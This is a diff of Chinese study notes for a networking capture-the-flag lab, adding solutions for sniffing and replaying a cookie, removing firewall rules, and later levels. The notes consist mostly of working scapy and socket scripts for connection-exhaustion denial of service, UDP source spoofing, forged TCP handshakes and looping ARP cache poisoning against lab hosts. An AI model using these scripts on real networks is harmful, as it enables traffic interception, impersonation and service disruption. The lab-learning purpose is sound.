@@ -22,8 +22,120 @@
     --min-parallelism 100 为最小并行数
     --stats-every 5s 为每5s输出一次扫描结果
     -p 31337 为扫描端口
+-Sniffing Cookie
+    --启动wireshark就能捕捉到cookie
+    --之后使用 curl -b "auth=cookie" http://10.0.0.2/flag
+        --此方法用于提交cookie
+--firewall
+    iptables -A INPUT  -s 10.0.0.2j  -j DROP
+        --此方法用于禁止端口31337的访问
+--firewall 
+    --使用相同格式
+--firewall3
+    --使用wireshark发现没有数据产生，是因为有了某些规则在阻止数据
+    --iptables -L -n
+        --此方法用于查看规则
+    --查看到OUTPUT出战有DROP规则
+    --iptables -D OUTPUT 1
+        --此方法用于删除规则
+    --nc 10.0.0.2 31337
+        --恢复正常通讯
+---Denial of service
+--sudo iptables -A INPUT -p tcp --dport 31337 -s 10.0.0.2 -d 10.0.0.3 -j DROP
+--sudo iptables -A OUTPUT -p tcp --dport 31337 -s 10.0.0.3 -d 10.0.0.2 -j DROP
+--nc 10.0.0.2 31337
+    --此方法用于禁止长度为1的包
+Denial of service 2
+-------------------------------
+import socket
+sockets=[]
+for i in range(100):
+    try:
+        s = socket.socket()
+        s.connect(("10.0.0.2", 31337))
+        sockets.append(s)
+        print(f"已建立连接数：{len(sockets)}")
+    except Exception as e:
+        pass
+input("flag")
+------------------------------
 
+UDP
+-------------
+import socket
+sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+server_address = ("10.0.0.2",31337)
+try:
+    message=b'Hello, World!\n'
+    sent = sock.sendto(message, server_address)
 
+    print("sent")
+    data, server = sock.recvfrom(1024)
+    print("received", data)
+finally:
+    print("closing")
+    sock.close()
+
+    --此方法用于发送udp包
+  -----------------------------------------  
+UDP2
+----------------------------
+import socket
+sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.bind(("0.0.0.0", 31338))
+server_address=("10.0.0.2",31337)
+try:
+    message=b'Hello, World!\n'
+    sent = sock.sendto(message, server_address)
+
+    print("sent")
+    data, server = sock.recvfrom(1024)
+    print("received", data)
+finally:
+    print("closing")
+    sock.close()
+----------------------------
+UDP Spoofing 1
+----------------------------
+from scapy.all import *
+ip = IP(src="10.0.0.3", dst="10.0.0.2")
+udp = UDP(sport=31337, dport=31338)
+payload = b"FLAG"
+packet = ip/udp/payload
+send(packet)
+----------------------------
+-UDP Spoofing 2
+    ----------------------------
+    from scapy.all import *
+    ip = IP(src="10.0.0.3", dst="10.0.0.2")
+    udp = UDP(sport=31337, dport=31338)
+    payload = b"FLAG:10.0.0.1:31337"
+    packet = ip/udp/payload
+    while True:
+        send(packet,iface="eth0")
+        time.sleep(0.1)
+    ----------------------------
+UDP Spoofing 3
+    ---------------------------
+    from scapy.all import *
+    import time
+
+    ip = IP(src="10.0.0.3", dst="10.0.0.2")
+    payload = b"FLAG:10.0.0.1:31337"
+
+    while True:
+        for dport in range(32768, 60999):
+            udp = UDP(sport=31337, dport=dport)
+            packet = ip / udp / payload
+            send(packet, iface="eth0", verbose=False)
+        time.sleep(0.1)
+
+    没有任何技巧巨浪费时间观察ip.src==10.0.0.2
+    ----------------------------
+UDP Spoofing 4
+    ---------------------------
+    跟上面的代码一样，没有任何变化巨浪费时间
+    ---------------------------
 level 6 
     通过tcpdump -i any port 31337 -w <name>.pcap
         --此方法用于抓包
@@ -32,7 +144,7 @@ level 6
             --此方法用于查看tcp流，后就能查看到flag
 level 7
     --此关卡需要将自己ip改为10.0.0.2，当前ip为10.0.0.3
-        --ip addr add 10.0.0.2/24 dev eth0
+        ip addr add 10.0.0.2/24 dev eth0
             --此方法用于修改ip地址
         后curl -l 31337
             --与10.0.0.4进行通信
@@ -67,3 +179,30 @@ level10
             sendp用于手动封装包
             --sendp(pack)
         --TCP依旧需要ip作为载体，所以需要先封装ip包
+level11
+    from scapy.all import *
+packet=(Ether(src="02:42:0a:11:18:87",dst="ff:ff:ff:ff:ff:ff")/IP(src="10.0.0.2",dst="10.0.0.3")/TCP(sport=31337, dport=31337, seq=31337, flags="S"))
+answered, unanswered= srp(packet,iface="eth0")
+
+
+send, revieve  = answered[0]
+
+sentdpacket=(Ether(src="02:42:0a:11:18:87",dst="ff:ff:ff:ff:ff:ff")/IP(src="10.0.0.2",dst="10.0.0.3")/TCP(sport=31337, dport=31337, seq=revieve[TCP].ack,ack=revieve[TCP].seq+1, flags="A"))
+
+sendp(sentdpacket,iface="eth0")
+
+--python 代码
+    难点在于理解第一次握手的flags和第二次握手的seq和ack
+level12
+   from scapy.all import *
+packet=Ether(src="06:6b:e9:ac:8b:f5", dst= "ff:ff:ff:ff:ff:ff")/ARP(hwtype=1,ptype=0x0800,hwlen=6,plen=4,hwsrc="06:6b:e9:ac:8b:f5",op="is-at",psrc="10.0.0.2",pdst="10.0.0.3")
+sendp(packet,iface="eth0")
+level13
+--  wireshark &
+
+from scapy.all import *
+packet=Ether(src=get_if_hwaddr("eth0"), dst= "ff:ff:ff:ff:ff:ff")/ARP(hwsrc=get_if_hwaddr("eth0"),op="is-at",psrc="10.0.0.3",pdst="10.0.0.2")
+while True:
+	sendp(packet,iface="eth0")
+	time.sleep(0.1)
+后再使用wireshark进行抓包，并且再filter中输入ip.src==10.0.0.2
